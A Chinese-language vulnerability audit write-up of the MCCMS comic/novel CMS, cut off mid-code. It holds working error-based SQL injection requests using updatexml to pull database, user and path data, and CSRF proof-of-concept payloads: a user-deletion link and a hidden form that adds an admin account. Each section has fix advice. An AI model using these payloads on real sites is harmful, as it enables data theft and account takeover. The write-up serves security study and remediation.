<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/user/Category.php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;BASEPATH&#x27;</span>) OR <span class="keyword">exit</span>(<span class="string">&#x27;No direct script access allowed&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Category</span> <span class="keyword">extends</span> <span class="title">Mccms_Controller</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//智能检索</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$uri</span> = <span class="variable language_">$this</span>-&gt;uri-&gt;<span class="title function_ invoke__">uri_string</span>();</span><br><span class="line">        <span class="variable">$n</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$uri</span>,<span class="string">&#x27;/index&#x27;</span>) !== <span class="literal">false</span> ? <span class="number">3</span> : <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$this</span>-&gt;uri-&gt;<span class="title function_ invoke__">uri_to_assoc</span>(<span class="variable">$n</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;tpl-&gt;<span class="title function_ invoke__">category</span>(<span class="variable">$arr</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>safe_replace</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//SQL过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">			<span class="variable">$string</span>[<span class="title function_ invoke__">safe_replace</span>(<span class="variable">$k</span>)] = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$v</span>); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%20&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">            <span class="comment">/*%20可以用+代替*/</span></span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%27&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%2527&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&amp;#039;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_encode</span>(<span class="variable">$string</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先简单构造一个</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">GET <span class="regexp">/index.php/</span>book<span class="regexp">/category/</span>order<span class="regexp">/addtime/</span>pay<span class="regexp">/1/</span>finish<span class="regexp">/1/</span>list/<span class="number">1</span>)+order+by+<span class="number">5</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>发现报错</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">从</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>select * from mc_book where yid=0 and pay=0 and serialize=&#x27;连载&#x27; and cid in(1&amp;#039) order by addtime desc<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">变成</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Unknown column &#x27;5&#x27; in &#x27;order clause&#x27;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">由符号报错，变成命令报错，看来我们的sql命令在这个构造中是可以执行的</span><br></pre></td></tr></table></figure>

<p>通过<code>order by</code>，判断出当前列数只有<code>1</code>列</p>
<p><img src="/2022/11/22/SYC/image-20221127003105524.png" alt="image-20221127003105524"></p>
<p><img src="/2022/11/22/SYC/image-20221127003130496.png" alt="image-20221127003130496"></p>
<p>此处的注入点代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$k</span> == <span class="string">&#x27;list&#x27;</span>)&#123; <span class="comment">//分类</span></span><br><span class="line">                   <span class="variable">$title</span>[] = <span class="variable">$data</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;book_class&#x27;</span>,<span class="string">&#x27;name&#x27;</span>,<span class="variable">$v</span>);</span><br><span class="line">                   <span class="keyword">if</span>((<span class="keyword">int</span>)<span class="variable">$v</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                       <span class="variable">$cids</span> = <span class="title function_ invoke__">getcid</span>(<span class="variable">$v</span>);</span><br><span class="line">                       <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$cids</span>))&#123;</span><br><span class="line">                           <span class="variable">$sql</span> .= <span class="string">&quot; and cid in(&quot;</span>.<span class="variable">$cids</span>.<span class="string">&quot;)&quot;</span>;</span><br><span class="line">                       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                           <span class="variable">$sql</span> .= <span class="string">&quot; and cid=&quot;</span>.<span class="variable">$cids</span>;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br></pre></td></tr></table></figure>

<p><code>$cid</code>就是引起<code>sql</code>注入的参数点</p>
<p>跟进<code>getcid</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//解析多个分类ID  如 cid=1,2,3,4,5,6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getcid</span>(<span class="params"><span class="variable">$CID</span>,<span class="variable">$type</span>=<span class="string">&#x27;class&#x27;</span>,<span class="variable">$zd</span>=<span class="string">&#x27;fid&#x27;</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ci</span> = &amp;<span class="title function_ invoke__">get_instance</span>();</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$CID</span>))&#123;</span><br><span class="line">		<span class="variable">$ClassArr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$CID</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$ClassArr</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">			<span class="variable">$sql</span>=<span class="string">&quot;select id from &quot;</span>.Mc_SqlPrefix.<span class="variable">$type</span>.<span class="string">&quot; where &quot;</span>.<span class="variable">$zd</span>.<span class="string">&quot;=&#x27;<span class="subst">$ClassArr</span>[<span class="subst">$i</span>]&#x27;&quot;</span>;<span class="comment">//sql语句的组织返回</span></span><br><span class="line">			<span class="variable">$result</span>=<span class="variable">$ci</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)-&gt;<span class="title function_ invoke__">result</span>();</span><br><span class="line">			<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">				<span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">					<span class="variable">$ClassArr</span>[]=<span class="variable">$row</span>-&gt;id;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$CID</span>=<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$ClassArr</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$CID</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尝试后发现无法进行联合注入</p>
<p>只能试试报错注入或者盲注</p>
<p>盲注试了试发现是无法得到反应的</p>
<p>于是我试了试报错注入</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">GET <span class="regexp">/index.php/</span>book<span class="regexp">/category/</span>order<span class="regexp">/addtime/</span>pay<span class="regexp">/1/</span>finish<span class="regexp">/1/</span>list/<span class="number">1</span>)+and+updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database(),<span class="number">0</span>x7e,user(),<span class="number">0</span>x7e,@@datadir),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/22/SYC/image-20221127141028144.png" alt="image-20221127141028144"></p>
<p>果然是报错注入，我们得到了我们想要的数据，虽然因为报错函数限制了显示数据字符个数，用<code>substring</code>即可</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">GET <span class="regexp">/index.php/</span>book<span class="regexp">/category/</span>order<span class="regexp">/addtime/</span>pay<span class="regexp">/1/</span>finish<span class="regexp">/1/</span>list/<span class="number">1</span>)+and+updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,substring(@@datadir,<span class="number">15</span>),<span class="number">0</span>x7e),<span class="number">1</span>)%<span class="number">23</span> </span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/22/SYC/image-20221127141800552.png" alt="image-20221127141800552"></p>
<p>最后得到</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">数据库名:mccms</span></span><br><span class="line"><span class="section">数据库管理员名字:root</span></span><br><span class="line"><span class="section">数据库路径: D:\phpstudy_pro\Extensions\MySQL8.0.12\data\</span></span><br></pre></td></tr></table></figure>

<h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>对代入<span class="keyword">sql</span>查询语句的参数进行严格过滤</span><br><span class="line"><span class="number">2.</span>减少用户对传入<span class="keyword">sql</span>查询的中参数的直接控制的机会</span><br><span class="line"><span class="number">3.</span>对一些数据函数禁止用，或者少用</span><br><span class="line"><span class="number">4.</span>最好不要直接把用户数据带入数据库中进行查询</span><br></pre></td></tr></table></figure>

<h3 id="3-后台一处安全漏洞"><a href="#3-后台一处安全漏洞" class="headerlink" title="3.后台一处安全漏洞"></a>3.后台一处安全漏洞</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">后台漏洞</span><br><span class="line">一般猜测为登录存在<span class="keyword">sql</span>注入，模板注入，越权，命令执行,csrf等等</span><br></pre></td></tr></table></figure>

<h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><p>由于之前修复过<code>sql</code>注入，所以在这里的可能性就很少了，于是对其他漏洞进行测试</p>
<p>不过，抓包过程中发现其信息皆是以明文形式发送</p>
<p>所以猜测存在<code>csrf</code></p>
<p>【先进行了漏洞测试】</p>
<p>以此处为例</p>
<p>对<code>csrf</code>实现控制管理员删除用户代码分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/admin/User.php</span></span><br><span class="line"><span class="comment">//删除会员</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">del</span>(<span class="params"><span class="variable">$id</span>=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line"> 	    <span class="variable">$id</span> = (<span class="keyword">int</span>)<span class="variable">$id</span>;</span><br><span class="line"> 	    <span class="keyword">if</span>(<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line"> 	    	<span class="variable">$ids</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;id&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">/*get_post先查看GET数据中的id，再查看POST数据中的id</span></span><br><span class="line"><span class="comment">            这里也是我们实现csrf的关键处，</span></span><br><span class="line"><span class="comment">            这里的id以明文显示，以明文读取，那么只要修改明文，任意的id都可以实现进行后续删除操作</span></span><br><span class="line"><span class="comment">            如果前端对明文数据加密，再在这里比较匹对后，再传参可能更安全*/</span></span><br><span class="line">            </span><br><span class="line"> 	    	<span class="variable">$ids</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$ids</span>);</span><br><span class="line">            <span class="comment">/*implode —用字符串连接数组元素*/</span></span><br><span class="line"> 	    	<span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$ids</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]+[,]?)+$/&#x27;</span>, <span class="variable">$ids</span>))&#123;</span><br><span class="line">				<span class="variable">$id</span> = <span class="variable">$ids</span>;</span><br><span class="line">			&#125;</span><br><span class="line"> 	    &#125;</span><br><span class="line"> 	    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$id</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;ID不能为空~!&#x27;</span>);</span><br><span class="line"> 	    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$id</span>);</span><br><span class="line"> 	    <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$_id</span>) &#123;</span><br><span class="line"> 	    	<span class="comment">//删除头像地址</span></span><br><span class="line">			<span class="variable">$pic</span> = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;pic&#x27;</span>,<span class="variable">$id</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;load-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;tongbu&#x27;</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;tongbu-&gt;<span class="title function_ invoke__">del</span>(<span class="variable">$pic</span>);</span><br><span class="line">			<span class="comment">//删除记录</span></span><br><span class="line">    		<span class="variable language_">$this</span>-&gt;mcdb-&gt;<span class="title function_ invoke__">get_del</span>(<span class="string">&#x27;user&#x27;</span>,<span class="variable">$_id</span>);</span><br><span class="line"> 	    &#125;</span><br><span class="line">		<span class="variable">$arr</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;恭喜您，删除成功~!&#x27;</span>;</span><br><span class="line">		<span class="variable">$arr</span>[<span class="string">&#x27;url&#x27;</span>] = <span class="title function_ invoke__">links</span>(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">		<span class="title function_ invoke__">get_json</span>(<span class="variable">$arr</span>,<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>



<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><code>CSRF</code>此处以管理员可以删除用户为例</p>
<p>这是在删除用户时进行的抓包数据，发现其信息皆以明文显示，只要修改<code>id</code>数据就可以达到删除指定用户的目的</p>
<p><img src="/2022/11/22/SYC/image-20221126222051780.png" alt="image-20221126222051780"></p>
<p>先创建<code>2</code>个用户，<code>id</code>为<code>3，4</code></p>
<p><img src="/2022/11/22/SYC/image-20221126222725930.png" alt="image-20221126222725930"></p>
<p>然后根据我们的抓包数据构造一个钓鱼的链接</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;http://127.0.0.3/admin.php/user/del?id%5B%5D=3&quot;</span>&gt;click me&lt;/<span class="keyword">a</span>&gt;  </span><br><span class="line"><span class="comment">#这里的id以GET方式提交也可以</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/22/SYC/image-20221126224127893.png" alt="image-20221126224127893"></p>
<p>保持登录的状态点击</p>
<p><img src="/2022/11/22/SYC/image-20221126224210939.png" alt="image-20221126224210939"></p>
<p>也试了试<code>4</code></p>
<p><img src="/2022/11/22/SYC/image-20221126224303900.png" alt="image-20221126224303900"></p>
<p>发现也显示成功</p>
<p>这是我们返回后台查看用户信息</p>
<p><img src="/2022/11/22/SYC/image-20221126224401491.png" alt="image-20221126224401491"></p>
<p>发现只有<code>ID=1</code>的用户了</p>
<p>我们的<code>csrf</code>也就攻击成功了</p>
<p>甚至添加后台管理员账户也是可以</p>
<p><img src="/2022/11/22/SYC/image-20221128180130164.png" alt="image-20221128180130164"></p>
<p><img src="/2022/11/22/SYC/image-20221128180148359.png" alt="image-20221128180148359"></p>
<p>构造钓鱼链接</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>MCCMS POST<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;btn2()&quot;</span>&gt;</span>MCCMS CSRF<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.3/admin.php/sys/save&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;nichen&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Ttoc&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">btn2</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> f = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;test&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            f.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>post</code>方式以火狐浏览器提交</p>
<p><img src="/2022/11/22/SYC/image-20221128201313981.png" alt="image-20221128201313981"></p>
<p>提交成功，成功向后台添加了我们的恶意用户</p>
<p><img src="/2022/11/22/SYC/image-20221128201331468.png" alt="image-20221128201331468"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">除此以外</span><br><span class="line"></span><br><span class="line">其他管理员可以控制的操作，比如修改用户金币数，月票数等等，因为都是以明文提交，都可以用csrf实现</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h4><figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line">此处我们发现用户凭据发现以明文形式发送</span><br><span class="line">那么中间就可能被第三方获取并利用，所以建议</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>对数据进行进一步的加密</span><br><span class="line"><span class="number">2.</span>可以在HTTP请求中加入一个随机产生的<span class="built_in">token</span>，并在后台服务器端验证<span class="built_in">token</span>，如果请求中没有<span class="built_in">token</span>或者<span class="built_in">token</span>内容不正确，则认为请求可能是csrf攻击，从而拒绝该请求</span><br><span class="line"><span class="number">3.</span>验证请求的referer值</span><br><span class="line"><span class="number">4.</span>对参数传入方式和验证的过程严格控制，以免传入外来恶意数据，导致信息泄露或丢失</span><br><span class="line"><span class="number">5.</span>用户二次验证，对于这种不可逆操作执行前进行比如手机验证码之类的第二次验证，不以cookie为唯一验证</span><br></pre></td></tr></table></figure>

<h3 id="4-作家发布漫画小说命令执行漏洞-复现失败"><a href="#4-作家发布漫画小说命令执行漏洞-复现失败" class="headerlink" title="4.作家发布漫画小说命令执行漏洞(复现失败)"></a>4.作家发布漫画小说命令执行漏洞(复现失败)</h3><h4 id="代码分析-漏洞利用-1"><a href="#代码分析-漏洞利用-1" class="headerlink" title="代码分析+漏洞利用"></a>代码分析+漏洞利用</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">猜测</span><br><span class="line">1.发布木马文件，导致命令执行</span><br><span class="line">2.一些客户端可以修改的参数，被命令执行函数包含且执行</span><br></pre></td></tr></table></figure>



<p>但根据的<code>2.5.8</code>更新文档</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Mccms</span>漫画小说系统-v2.<span class="number">5</span>.<span class="number">8</span>更新详情</span><br><span class="line"><span class="attribute">1</span>.修复了SQL注入高危漏洞</span><br><span class="line"><span class="attribute">2</span>.修复了木马伪装图片上传漏洞</span><br></pre></td></tr></table></figure>

<p>所以如果通过漫画图片上传木马，大概率是行不通了</p>
<p>先注册完信息，再后台完成作者认证</p>
<p><img src="/2022/11/22/SYC/image-20221122151951892.png" alt="image-20221122151951892"></p>
<p><img src="/2022/11/22/SYC/image-20221122152043515.png" alt="image-20221122152043515"></p>
<h5 id="漫画"><a href="#漫画" class="headerlink" title="漫画"></a>漫画</h5><p>但是也可以试试上传图片马，看看它怎么修复的</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">这里限制了文件类型，可以试试能不能绕过</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/22/SYC/image-20221122152444788.png" alt="image-20221122152444788"></p>
<p>直接上传脚本文件会被拦截</p>
<p><img src="/2022/11/22/SYC/image-20221122153207506.png" alt="image-20221122153207506"></p>
<p>上传图片🐎的话 ，会显示非法图片</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/author/Chapter.php</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">do_upload</span>(<span class="string">&#x27;image&#x27;</span>))&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">display_errors</span>();</span><br><span class="line">            <span class="title function_ invoke__">get_json</span>(<span class="variable">$msg</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="variable language_">$this</span>-&gt;upload-&gt;<span class="title function_ invoke__">data</span>();</span><br><span class="line">            <span class="variable">$img_path_file</span> = <span class="variable">$arr</span>[<span class="string">&#x27;full_path&#x27;</span>];</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">checkPicHex</span>(<span class="variable">$img_path_file</span>);</span><br><span class="line">           <span class="comment">/*关键在这里，让对我们上传图片的内容进行了检查导致无法上传*/</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span> == <span class="number">1</span>) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;非法图片&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>跟进函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//检查上传图片是否包含木马</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPicHex</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="variable">$resource</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>,<span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">        <span class="variable">$fileSize</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$resource</span>, <span class="number">0</span>);<span class="comment">//把文件指针移到文件的开头</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$fileSize</span> &gt; <span class="number">512</span>)&#123; <span class="comment">// 若文件大于521B文件取头和尾</span></span><br><span class="line">            <span class="variable">$hexCode</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>, <span class="number">512</span>));</span><br><span class="line">            <span class="comment">/*fread —二进制安全文件读取*/</span></span><br><span class="line">            <span class="title function_ invoke__">fseek</span>(<span class="variable">$resource</span>, <span class="variable">$fileSize</span> - <span class="number">512</span>);<span class="comment">//把文件指针移到文件尾部</span></span><br><span class="line">            <span class="variable">$hexCode</span> .= <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$resource</span>,<span class="number">512</span>));</span><br><span 